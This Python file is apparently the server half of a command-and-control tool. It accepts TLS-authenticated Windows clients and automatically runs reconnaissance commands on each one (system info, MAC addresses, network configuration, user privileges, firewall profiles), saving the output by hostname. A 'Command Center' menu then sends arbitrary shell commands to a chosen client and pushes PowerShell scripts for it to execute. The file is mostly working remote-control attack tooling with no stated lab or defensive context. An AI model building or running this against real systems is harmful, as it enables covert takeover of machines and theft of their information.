import socket
import os
from datetime import datetime, timezone
from prettytable import PrettyTable
import threading
import ssl

clients = {}
clients_lock = threading.Lock()
server_socket = None
server_running = True

def parse_systeminfo(systeminfo_output):
    details = {}
    for line in systeminfo_output.splitlines():
        if "Host Name" in line:
            details["Host Name"] = line.split(":")[1].strip()
        elif "OS Name" in line:
            details["OS Name"] = line.split(":")[1].strip()
        elif "Registered Owner" in line:
            details["Registered Owner"] = line.split(":")[1].strip()
        elif "Registered Organization" in line:
            details["Registered Organization"] = line.split(":")[1].strip()
    return details

def sanitize_ip_port(flag):
    try:
        parts = flag.split('**')
        ip = parts[1].strip()
        port = ''.join(filter(str.isdigit, parts[3].strip()))
        if ip and port.isdigit():
            return ip, port
    except (IndexError, ValueError):
        return None, None
    return None, None

def write_client_flags():
    with open("client_flags.txt", "w") as f:
        with clients_lock:
            for idx, (sock, flags) in enumerate(clients.items(), start=1):
                ip_flags = [flag.split()[1] for flag in flags if "IP_ADDRESS" in flag]
                port_flags = [flag.split()[1] for flag in flags if "PORT_NUMBER" in flag]
                hostname = [flag.split()[1] for flag in flags if "HOSTNAME" in flag][0]
                f.write(f"Client {idx}: \n")
                f.write(f"Hostname : {hostname}\n")
                f.write(f"IP Address : {', '.join(ip_flags)}\n")
                f.write(f"Port Number : {', '.join(port_flags)}\n\n")

def refresh_clients():
    print("\n")
    print("Connected Clients : ")
    print("\n")
    client_table = PrettyTable()
    client_table.field_names = ["Serial No", "Hostname", "Client IP", "Client Port"]
    with clients_lock:
        for idx, (sock, flags) in enumerate(clients.items(), start=1):
            ip_flags = [flag.split()[1] for flag in flags if "IP_ADDRESS" in flag]
            port_flags = [flag.split()[1] for flag in flags if "PORT_NUMBER" in flag]
            hostname = [flag.split()[1] for flag in flags if "HOSTNAME" in flag][0]
            client_table.add_row([idx, hostname, ", ".join(ip_flags), ", ".join(port_flags)])
    print(client_table)
    write_client_flags()

def handle_client(client_socket):
    try:
        client_flags = []
        flag_received = False
        hostname_received = False
        while not flag_received or not hostname_received:
            flag = client_socket.recv(1024).decode()
            if not flag:
                break
            if "IP_ADDRESS" in flag and "PORT_NUMBER" in flag:
                ip, port = sanitize_ip_port(flag)
                if ip and port:
                    if f"IP_ADDRESS {ip}" not in client_flags:
                        client_flags.append(f"IP_ADDRESS {ip}")
                    if f"PORT_NUMBER {port}" not in client_flags:
                        client_flags.append(f"PORT_NUMBER {port}")
                    flag_received = True
                else:
                    print(f"Invalid IP or Port received: {flag}")
            if "HOSTNAME" in flag:
                hostname = flag.split('**')[-1].strip()
                if not any(f"HOSTNAME {hostname}" in s for s in client_flags):
                    client_flags.append(f"HOSTNAME {hostname}")
                hostname_received = True
        recon_commands = [
            'systeminfo',
            'getmac',
            'ipconfig /all',
            'whoami /priv',
            'netsh advfirewall show allprofiles',
        ]
        recon_output = {}
        for command in recon_commands:
            client_socket.send(command.encode())
            output = b""            
            while True:
                chunk = client_socket.recv(4096)
                output += chunk
                if len(chunk) < 4096:
                    break
            recon_output[command] = output.decode()
        system_info = parse_systeminfo(recon_output.get('systeminfo', ''))
        parsed_hostname = system_info.get("Host Name", "Unknown").upper()
        if parsed_hostname != "Unknown" and f"HOSTNAME {parsed_hostname}" not in client_flags:
            client_flags = [flag for flag in client_flags if not flag.startswith("HOSTNAME")] 
            client_flags.append(f"HOSTNAME {parsed_hostname}")
        with clients_lock:
            clients[client_socket] = client_flags
        user_dir = f"./{parsed_hostname}"
        os.makedirs(user_dir, exist_ok=True)
        current_date = datetime.now(timezone.utc).strftime('%Y-%m-%d')
        date_dir = os.path.join(user_dir, current_date)
        os.makedirs(date_dir, exist_ok=True)
        current_time = datetime.now(timezone.utc).strftime('%H-%M-%S')
        time_dir = os.path.join(date_dir, current_time)
        os.makedirs(time_dir, exist_ok=True)
        recon_dir = os.path.join(time_dir, 'recon')
        os.makedirs(recon_dir, exist_ok=True)
        for command, output in recon_output.items():
            sanitized_command = '_'.join(filter(None, ''.join(c if c.isalnum() else '_' for c in command).split('_')))
            command_file = os.path.join(recon_dir, f"{sanitized_command}.txt")
            with open(command_file, 'w') as f:
                f.write(f"Command: {command}\n")
                f.write(f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d')}\n")
                f.write(f"UTC Time: {datetime.now(timezone.utc).strftime('%H-%M-%S')}\n")
                f.write(output)
        write_client_flags()
        while server_running:
            pass
    except Exception as e:
        print(f"Error in handle_client: {e}")
    finally:
        with clients_lock:
            clients.pop(client_socket, None)
        client_socket.close()

def input_thread():
    global server_running, server_socket
    while server_running:
        print("\n")
        print("+==============================================+")
        print("|                COMMAND CENTER                |")
        print("+==============================================+")
        print("| 'refresh'         : Refresh the Client List  |")
        print("| '<serial_number>' : Enter Client Session     |")
        print("| 'exit'            : Quit                     |")
        print("+==============================================+")
        print("\n")
        command = input("$ ")
        if command.lower() in ['q', 'e', 'quit', 'exit']:
            print("\n")
            print("Shutting down server and disconnecting all clients...")
            server_running = False
            with clients_lock:
                for client_sock in list(clients.keys()):
                    client_sock.send(b"EXIT_SERVER")
                    client_sock.close()
            server_socket.close()
            break
        elif command.lower() == 'refresh':
            refresh_clients()
        elif command.isdigit() and int(command) in range(1, len(clients) + 1):
            client_sock = list(clients.keys())[int(command) - 1]
            flags = clients[client_sock]
            ip_list = [flag.split(' ')[1] for flag in flags if 'IP_ADDRESS' in flag]
            client_ip_selected = ip_list[0] if ip_list else 'Unknown'
            while True:
                print("\n")
                print("+========================================================+")
                print("|            CLIENT CONTROL PANEL - {}            |".format(client_ip_selected))
                print("+========================================================+")
                print("| 'back'      : Return to the Command Center             |")
                print("| '<command>' : Execute a Command                        |")
                print("| 'script'    : Execute a Script                         |")
                print("| 'exit'      : Quit                                     |")
                print("+=========================================================")
                print("\n")
                exec_command = input("$ ")
                if exec_command.lower() in ['q', 'e', 'quit', 'exit']:
                    client_sock.send(f"EXIT_CLIENT {client_ip_selected}".encode())
                    client_sock.close()
                    with clients_lock:
                        clients.pop(client_sock, None)
                    break
                elif exec_command.lower() == 'back':
                    break
                elif exec_command.lower() == 'script':
                    while True:
                        print("\n")
                        print("+===========================================================================+")
                        print("|                         SCRIPT UPLOAD - {}                         |".format(client_ip_selected))
                        print("+===========================================================================+")
                        print("| '<script_filename_w_extension>' : Execute a Script on Client Machine      |")
                        print("| 'exit'                          : Return to Client Control Panel          |")
                        print("+===========================================================================+")
                        print("\n")
                        script_filename = input("$ ")
                        if script_filename.lower() == 'exit':
                            break
                        if os.path.isfile(script_filename) and script_filename.endswith('.ps1'):
                            client_sock.send(b"SCRIPT_START")
                            with open(script_filename, 'r') as script_file:
                                for line in script_file:
                                    client_sock.send(line.encode())
                            client_sock.send(b"SCRIPT_END")
                            print("\n")
                            print(f"Script '{script_filename}' sent to the client.")
                        else:
                            print("File does not exist or invalid extension.")
                else:
                    client_sock.send(exec_command.encode())
                    output = b""
                    while True:
                        chunk = client_sock.recv(4096)
                        if not chunk:
                            break
                        output += chunk
                        if len(chunk) < 4096:
                            break                    
                    output = output.decode()
                    print("\n")
                    print(f"Client {client_ip_selected} executed : {exec_command}")
                    print("\n")
                    print(f"Output : \n\n{output}")

def start_server():
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('', 8080))
    server_socket.listen(5)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="./ssl_certificates/server_ssl_certificates/server_cert.pem", keyfile="./ssl_certificates/server_ssl_certificates/server_key.pem")
    context.load_verify_locations(cafile="./ssl_certificates/ca_ssl_certificates/ca_cert.pem")
    context.verify_mode = ssl.CERT_REQUIRED
    server_socket = context.wrap_socket(server_socket, server_side=True)
    print("\n")
    print("Server started and waiting for connections...")  
    threading.Thread(target=input_thread, daemon=True).start()
    while server_running:
        try:
            client_socket, client_address = server_socket.accept()
            threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start()
            if server_running == False:
                os._exit(0)
                return
        except OSError:
            break

if __name__ == "__main__":
    start_server()